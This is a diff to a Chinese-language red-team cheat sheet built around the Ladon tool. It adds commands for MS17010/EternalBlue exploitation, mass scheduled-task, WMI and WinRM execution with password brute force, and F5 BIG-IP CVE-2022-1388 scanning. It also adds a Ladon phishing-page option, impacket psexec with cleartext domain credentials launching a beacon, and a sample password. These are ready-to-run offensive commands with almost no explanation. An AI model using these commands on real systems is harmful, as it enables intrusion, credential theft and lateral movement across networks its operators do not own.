@@ -119,13 +119,17 @@ while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 
 [​MS17010 打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
 [py/Cobalt Strike DLL](https://www.cnblogs.com/Thorndike/p/15242477.html)
+[Ladon 0day 通用 DLL 生成器-MS17010 演示 上线 CS](http://k8gege.org/Ladon/cmddll.html)
 
 常用
 
 ```sh
 Ladon.exe 192.168.50.153 MS17010
+# 多打几次
 fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
-# "1qaz@WSX!@#4"
+# sysadm "1qaz@WSX!@#4"
+
+ksmb 192.168.1.89
 # 3. https://www.freebuf.com/vuls/356052.html
 Eternalblue
 ```
@@ -368,6 +372,57 @@ powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
 ```
 
 powershell 版使用同样非常简单，只需最后的“Ladon whoami”命令，替换成你想要执行的命令即可，
+
+#### Web
+
+```bash
+Ladon WebServer 800
+Ladon Web 800 dir
+Ladon Web 800 c:\webroot
+Ladon Web 800 fish /login google.com
+```
+
+#### ini
+
+[ini 插件教程](https://mp.weixin.qq.com/s/2H-iFnJRhDhT6lV3I-VeUw)
+
+```sh
+Ladon 192.168.52.0/24 myini\ping.ini   # 检测C段
+Ladon 192.168.1.8/b   ping.ini  检测B段
+Ladon ip.txt ping.ini  检测IP列表 (ip.txt里放准备好的ip)
+
+# Ladon批量Schtask执行命令
+
+Ladon 10.1.10.8/24 SchtaskScan.ini   检测C段
+Ladon 10.1.10.8/b SchtaskScan.ini    检测B段
+Ladon ip.txt SchtaskScan.ini         批量检测IP列表
+Ladon ip24.txt SchtaskScan.ini       批量检测C段列表
+Ladon ip16.txt SchtaskScan.ini       批量检测B段列表
+
+# Ladon批量执行wmiexec
+
+Ladon 10.1.10.8/24 WmiScan.ini   检测C段
+Ladon 10.1.10.8/b WmiScan.ini     检测B段
+Ladon ip.txt WmiScan.ini               批量检测IP列表
+Ladon ip24.txt WmiScan.ini           批量检测C段列表
+Ladon ip16.txt WmiScan.ini           批量检测B段
+
+# Winrm远程命令/端口复用后门/WinrmCmd/密码爆破
+# http://k8gege.org/Ladon/WinrmScan.html
+
+# CVE-2022-1388  F5 BIG-IP 批量F5漏洞检测命令
+
+Ladon 192.168.60.1/24 F5poc.ini  检测C段
+Ladon 192.168.60.1/b F5poc.ini    检测B段
+Ladon ip.txt F5poc.ini               批量检测IP列表
+Ladon ip24.txt F5poc.ini           批量检测C段列表
+Ladon ip16.txt F5poc.ini           批量检测B段列表
+
+# pythonpoc
+
+Ladon tar.txt pythonpoc.ini
+Ladon url.txt pythonpoc.ini
+```
 
 # proxy 代理
 
@@ -876,6 +931,12 @@ psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执�
 
 ```sh
 pip install impacket
+# 安装后产生命令
+impacket-xxxx
+impacket-GetNPUsers
+```
+
+```sh
 # 注意前缀本例是域名 god/
 # 1.命令行
 python psexec.py god/administrator:hongrisec@2019@192.168.52.143
